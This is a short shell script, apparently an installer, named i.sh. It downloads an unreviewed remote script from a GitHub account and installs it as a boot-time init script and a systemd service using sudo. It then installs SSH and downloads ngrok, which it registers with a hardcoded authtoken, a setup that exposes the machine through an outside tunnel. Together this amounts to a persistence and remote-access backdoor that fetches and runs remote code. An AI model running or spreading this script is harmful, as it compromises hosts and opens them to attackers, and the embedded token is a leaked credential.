#!/bin/sh
# i.sh


wget -O rel.sh https://raw.githubusercontent.com/ars7v/in/main/m.sh & wait
chmod +x rel.sh & wait

sudo cp rel.sh /usr/local/bin/rel & wait
sudo cp rel.sh /etc/init.d/rel.sh & wait
sudo cp rel.sh /etc/rcS.d/S01rel.sh & wait
rm -f rel.sh & wait


wget -O rel.service https://raw.githubusercontent.com/ars7v/in/main/m.service & wait
sudo mv rel.service /usr/local/etc/ & wait

sudo systemctl link /usr/local/etc/rel.service & wait
sudo systemctl daemon-reload & wait
sudo systemctl enable rel.service & wait


echo "y" | sudo apt install ssh & wait

wget -O ngrok-stable-linux-amd64.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip & wait

unzip ngrok-stable-linux-amd64.zip ngrok & wait
rm -f ngrok-stable-linux-amd64.zip & wait
sudo chmod +x ngrok & wait
sudo mv ngrok /usr/local/bin/ & wait

sudo /usr/local/bin/ngrok authtoken 1qC4wDG4OxkTkDZPgmNAJAkmH7N_61a9nCVvokqwgTgv5eBZi

